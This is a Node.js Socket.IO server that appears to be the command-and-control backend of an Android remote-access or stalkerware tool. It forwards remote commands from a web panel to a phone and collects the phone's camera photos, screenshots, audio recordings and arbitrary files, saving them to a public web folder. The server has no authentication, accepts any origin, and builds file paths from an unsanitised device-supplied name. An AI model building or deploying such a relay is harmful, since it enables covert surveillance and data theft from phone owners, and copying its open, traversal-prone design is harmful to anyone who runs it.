const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.static('public'));
app.get('/ping', (req, res) => res.send('pong'));

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8, // 100MB for fast files/mirror
    pingTimeout: 30000,
    pingInterval: 10000
});

let androidSocket = null;
let webSocket = null;

io.on('connection', (socket) => {
    const isWeb = socket.handshake.query.type === 'web';

    if (isWeb) {
        webSocket = socket;
        if (androidSocket) webSocket.emit('device_status', { connected: true, model: androidSocket.model });

        socket.on('gui_command', (data) => {
            if (androidSocket) androidSocket.emit('remote_command', data);
        });
    } else {
        if (androidSocket) androidSocket.disconnect();
        androidSocket = socket;
        androidSocket.model = socket.handshake.query.model || "Unknown";
        if (webSocket) webSocket.emit('device_status', { connected: true, model: androidSocket.model });

        socket.onAny((event, data) => {
            if (webSocket) webSocket.emit(event, data);
        });

        // Specialized File/Image Handlers
        socket.on('child_photo_taken', (data) => saveFile('captured_photo.jpg', data.image, 'child_photo_taken'));
        socket.on('child_screenshot', (data) => saveFile('captured_screenshot.jpg', data.image, 'child_screenshot_ready'));

        socket.on('child_audio_recorded', (data) => {
            const name = `audio_${Date.now()}.mp3`;
            saveFile(`downloads/${name}`, data.audio, 'audio_ready', { url: `/downloads/${name}`, name });
        });

        socket.on('file_data', (data) => {
            saveFile(`downloads/${data.file_name}`, data.file_data, 'download_ready', { name: data.file_name });
        });

        socket.on('disconnect', () => {
            androidSocket = null;
            if (webSocket) webSocket.emit('device_status', { connected: false });
        });
    }
});

function saveFile(filename, base64, emitEvent, extraData = {}) {
    try {
        const buffer = Buffer.from(base64, 'base64');
        if (!fs.existsSync('public/downloads')) fs.mkdirSync('public/downloads');
        fs.writeFileSync(`public/${filename}`, buffer);
        if (webSocket) webSocket.emit(emitEvent, extraData);
    } catch (e) { console.error("Save Error:", e); }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`ELITE SERVER ACTIVE ON PORT ${PORT}`));
